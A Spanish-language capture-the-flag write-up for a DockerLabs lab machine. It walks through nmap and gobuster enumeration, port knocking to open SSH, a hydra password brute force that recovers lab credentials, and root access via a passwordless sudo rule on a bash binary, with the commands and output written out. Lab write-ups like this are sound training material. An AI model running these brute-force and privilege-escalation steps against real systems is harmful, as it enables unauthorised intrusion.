Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #port-knocking #ssh #brute-force #sudo-abuse

![](assets/Pasted%20image%2020251111220929.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.288 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.288/0.288/0.288/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 172.17.0.2
------------------------------------------------------------- 
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 72:F4:83:41:09:BF (Unknown)
```

- Solo el puerto 80 HTTP está abierto.

Sobre el puerto abierto realizo un segundo escaneo más profundo para detectar servicios y versiones.

```bash
> nmap -p 80 -sCV --min-rate 5000 -Pn -n -vvv 172.17.0.2 -oN target.txt
---------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 72:F4:83:41:09:BF (Unknown)
```

- Puerto 80 HTTP Apache httpd 2.4.58 (Ubuntu)

## Enumeración

### Puerto 80 HTTP

La página principal muestra la página por defecto de Apache2.

![](assets/Pasted%20image%2020251111213632.png)

**Fuzzing de Directorios.**

Utilizo `gobuster` para descubrir recursos ocultos.

```bash
> gobuster dir -w directory-list-2.3-medium.txt -u http://172.17.0.2/ -x html,php,py,txt,phar,js
-------------------------------------------------------------------------------------------------
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.phar                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10792]
/.php                 (Status: 403) [Size: 275]
/qdefense.txt         (Status: 200) [Size: 111]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.phar                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```

- Encuentro un archivo `qdefense.txt`

**qdefense.txt**

El contenido del archivo contiene un mensaje raro: `toctoc 7000 8000 9000`.

- Una secuencia de numeros y un posible usuario `toctoc`

![](assets/Pasted%20image%2020251111213750.png)

Sabiendo que nmap solo identificó un puerto abierto (80), esta frase sugiere que podría existir un puerto oculto detrás de **Port Knocking**. La secuencia `7000 8000 9000` podría ser la "contraseña" para abrir el puerto, y `toctoc` podría ser un usuario.

### Port Knocking

**Port Knocking** es una técnica de seguridad que oculta puertos detrás de una "contraseña" que consiste en una secuencia específica de conexiones a puertos determinados. Solo después de "tocar" los puertos en el orden correcto, el puerto objetivo se abre temporalmente para nuestra IP.

Realizo Port Knocking utilizando la herramienta `knock` con la secuencia encontrada.

```bash
> knock 172.17.0.2 7000 8000 9000
```

Para verificar si se abrió algún puerto, vuelvo a realizar un escaneo con nmap.

```bash
> nmap -p- -sCV --min-rate 5000 -Pn -n -vvv 172.17.0.2 -oN target.txt
----------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:ef:4e:ec:c9:3e:3d:68:dd:f5:1f:23:21:a3:98:83 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPS7n1A1eIxBuRhMdsVQA1jRG8wdysmEZiaohqGafMbS+pLcfCIIx72ZM52ZQk2IICu9yUlJ36aWcwUEJLZOcVI=
|   256 3e:c1:74:c1:44:af:6f:d0:90:15:4c:95:46:0a:ea:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOu2/XQXey3Lb+jyGxtHholEH5Znu26WzWLDN/K6zL2Q
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 72:F4:83:41:09:BF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- El puerto 22 SSH ahora está abierto.

## Explotación

### Brute Force SSH

Con el puerto SSH abierto y el posible usuario `toctoc` identificado, realizo un ataque de fuerza bruta con `hydra`.

```bash
> hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20
----------------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
```

- Credenciales encontradas: `toctoc:kittycat`

Me conecto por SSH con las credenciales encontradas.

```bash
> ssh toctoc@172.17.0.2
toctoc@172.17.0.2's password: kittycat
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.12.32-amd64 x86_64)

toctoc@c561ed7e00d4:~$ whoami
toctoc
toctoc@c561ed7e00d4:~$ id
uid=1000(toctoc) gid=1000(toctoc) groups=1000(toctoc)
```

![](assets/Pasted%20image%2020251111220554.png)

## Escalada de Privilegios

Enumero binarios que pueda ejecutar con privilegios elevados.

```bash
> sudo -l
---------------------------------------------------------------------------------------------------
toctoc@c561ed7e00d4:~$ sudo -l
User toctoc may run the following commands on c561ed7e00d4:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

- Puedo ejecutar `/opt/bash` como root sin contraseña.

Ejecuto el binario `bash` como root para spawnear una shell.

```bash
> toctoc@c561ed7e00d4:~$ sudo /opt/bash
root@c561ed7e00d4:/home/toctoc# whoami
root
root@c561ed7e00d4:/home/toctoc# id
uid=0(root) gid=0(root) groups=0(root)
```

![](assets/Pasted%20image%2020251111220534.png)

***PWNED***